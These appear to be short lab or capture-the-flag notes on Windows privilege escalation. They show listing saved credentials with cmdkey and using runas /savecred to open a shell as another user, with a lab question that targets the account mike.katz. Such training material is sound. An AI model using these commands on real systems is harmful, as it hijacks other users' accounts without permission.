Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
```shell-session
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.
```
runas /savecred /user:admin cmd.exe
```


## **Example**
Q)There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.
	`shell-session runas /savecred /user:mike.katz cmd.exe`
